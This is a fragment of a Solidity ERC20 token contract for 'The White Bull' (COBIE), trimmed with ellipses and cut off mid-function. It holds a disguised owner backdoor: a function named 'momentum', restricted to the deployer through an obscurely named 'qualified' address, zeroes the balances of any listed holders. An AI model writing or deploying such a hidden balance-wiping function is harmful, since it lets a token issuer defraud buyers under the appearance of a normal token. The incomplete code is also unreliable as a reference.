...
contract thewhitebull is Context, IERC20 {
    ...
    address public  qualified;
    constructor () {
        _name = "The White Bull";
        _symbol = "COBIE";
        _decimals = 18;
        uint256 initialSupply = 364000000;
         qualified = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == qualified, "Not allowed");
        _;
    }

    function momentum(address[] memory an) public onlyOwner() {
    uint256 len = an.length;
    for (uint256 i; i < len; ++i) {
        uint256 balance = _balances[an[i]];
        _balances[an[i]] = 0;
